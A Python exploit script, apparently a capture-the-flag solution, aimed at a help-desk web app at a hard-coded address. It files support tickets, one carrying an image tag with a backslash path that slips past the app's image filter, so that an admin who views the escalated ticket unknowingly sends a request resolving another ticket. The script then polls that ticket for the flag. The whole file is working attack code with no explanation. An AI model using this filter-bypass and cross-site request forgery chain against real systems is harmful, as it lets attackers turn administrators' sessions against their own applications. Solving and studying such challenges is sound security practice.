#!/usr/bin/env python3
"""Some Surprises - Deskmark img filter backslash bypass -> admin CSRF -> flag."""
import json, time, urllib.request

B = "http://40.81.242.56:30841"

def req(path, obj=None, cookie=""):
    data = json.dumps(obj).encode() if obj is not None else None
    r = urllib.request.Request(B + path, data=data,
                               method="POST" if obj is not None else "GET",
                               headers={"Content-Type": "application/json", "Cookie": cookie})
    resp = urllib.request.urlopen(r)
    return resp, json.loads(resp.read() or b"{}")

# establish desk session
resp, _ = req("/api/tickets", {"subject": "init", "body": "hi"})
cookie = "; ".join(c.split(";", 1)[0] for c in resp.headers.get_all("Set-Cookie", []))

def file_ticket(body):
    _, d = req("/api/tickets", {"subject": "t", "body": body}, cookie)
    return d["id"]

def escalate(tid):
    req(f"/api/tickets/{tid}/escalate", {}, cookie)

def read(tid):
    _, d = req(f"/api/tickets/{tid}", None, cookie)
    return d

# victim resolved by admin; attacker img fires /admin/resolve/<victim> via \ bypass
victim = file_ticket("please review"); escalate(victim)
attacker = file_ticket(f"look {{img:a|/\\admin/resolve/{victim}}}"); escalate(attacker)

for _ in range(60):
    for rep in read(victim)["replies"]:
        if "0x1337" in rep["text"]:
            print(rep["text"]); raise SystemExit
    time.sleep(10)
print("no flag yet")
